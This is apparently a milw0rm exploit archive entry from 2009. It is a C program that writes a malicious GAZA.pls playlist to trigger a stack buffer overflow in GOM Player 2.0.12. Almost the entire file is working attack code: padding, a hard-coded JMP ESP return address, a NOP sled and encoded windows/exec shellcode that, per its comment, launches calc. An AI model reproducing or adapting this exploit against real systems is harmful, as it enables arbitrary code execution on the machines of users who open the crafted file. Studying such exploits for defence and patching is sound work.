/*------------------------------------------------
*  GOM Player 2.0.12 (.PLS) Universal Buffer Overflow Exploit
*-------------------------------------------------
* Discoverd & Exploited:Mountassif Moad
* http://v4-Team.com & v4 Team & Evil Finger
* Stack(at)hotmail(dot).fr
*
* NOTIFICATION:
* The vulnerabilty Poc was reported by Parvez Anwar in Secuina http://secunia.com/advisories/23994
* by (.ASX) file after that DATA_SNIPER exploit it in http://www.milw0rm.com/exploits/7702
* and this a news exploit for (.PLS) file Exploited By Stack idea of exploit inspired from DATA_SNIPER
*  Thnx all friends
*/
#include <stdio.h>
#include <windows.h>
unsigned char Header1[] =  /*PLS Fist sentence format HEx 16 Bit */
"\x5b\x70\x6c\x61\x79\x6c\x69\x73\x74\x5d"
"\x0d\x0a\x0d\x0a\x4e\x75\x6d\x62\x65\x72"
"\x4f\x66\x45\x6e\x74\x72\x69\x65\x73\x3d"
"\x31\x0d\x0a\x0d\x0a\x46\x69\x6c\x65\x31"
"\x3d\x68\x74\x74\x70\x3a\x2f\x2f";;
unsigned char Header2[] ="\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20";
/*windows/exec - 144 bytes,Encoder: CMD=calc*/
unsigned char Shell[] =
"\x31\xc9\xbd\x90\xb7\x29\xb8\xd9\xf7\xd9\x74\x24\xf4\xb1\x1e"
"\x58\x31\x68\x11\x03\x68\x11\x83\xe8\x6c\x55\xdc\x44\x64\xde"
"\x1f\xb5\x74\x54\x5a\x89\xff\x16\x60\x89\xfe\x09\xe1\x26\x18"
"\x5d\xa9\x98\x19\x8a\x1f\x52\x2d\xc7\xa1\x8a\x7c\x17\x38\xfe"
"\xfa\x57\x4f\xf8\xc3\x92\xbd\x07\x01\xc9\x4a\x3c\xd1\x2a\xb7"
"\x36\x3c\xb9\xe8\x9c\xbf\x55\x70\x56\xb3\xe2\xf6\x37\xd7\xf5"
"\xe3\x43\xfb\x7e\xf2\xb8\x8a\xdd\xd1\x3a\x4f\x82\x28\xb5\x2f"
"\x6b\x2f\xb2\xe9\xa3\x24\x84\xf9\x48\x4a\x19\xac\xc4\xc3\x29"
"\x27\x22\x90\xea\x5d\x83\xff\x94\x79\xc1\x73\x01\xe1\xf8\xfe"
"\xdf\x46\xfa\x18\xbc\x09\x68\x84\x43";
int main( int argc, char **argv ) {
char payload[4563];
char junk[4171];
unsigned char RET_Univ[] = "\x5D\x38\x82\x7C"; // JMP ESP in GOM.exe this make it universal
/*This is RET_sp2 FR = "\x5D\x38\x82\x7C" /*  JMP ESP in kernel32.dll XP SP2 fr */
unsigned char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90"; //Nops
FILE *f;
printf("GOM Player 2.0.12 (.pls) Universal Buffer Overflow Exploit\r\n");
printf("---------------------------------------------------\r\n");
memset(junk, 0x41, 4171);
printf("[_] Building Exploit..\r\n");
memcpy( payload, Header1, sizeof( Header1 ) - 1 );
memcpy( payload + sizeof( Header1 ) - 1, junk, 4172 );
memcpy( payload + sizeof( Header1 ) + sizeof(junk)-1, RET_Univ, 4 );
memcpy( payload + sizeof( Header1 ) + sizeof(junk)+sizeof(RET_Univ)-2, nop, sizeof(nop)-1 );
memcpy( payload + sizeof( Header1 ) + sizeof(junk)+sizeof(nop)+sizeof(RET_Univ)-3, Shell, sizeof( Shell ) - 1 );
memcpy( payload + sizeof( Header1 ) + sizeof(junk)+sizeof(RET_Univ)+sizeof(nop)+ sizeof(Shell)-4, Header2, sizeof( Header2 ) - 1 );
f = fopen( "GAZA.pls", "wb" );
if ( f == NULL ) {
printf("[_] Cannot create file\n");
return 0;
}
fwrite( payload, 1, sizeof(payload) , f );
fclose( f );
    printf("[_] GAZA.Pls file Created,Credit: Stack :)\r\n");
return 0;
}

// milw0rm.com [2009-01-30]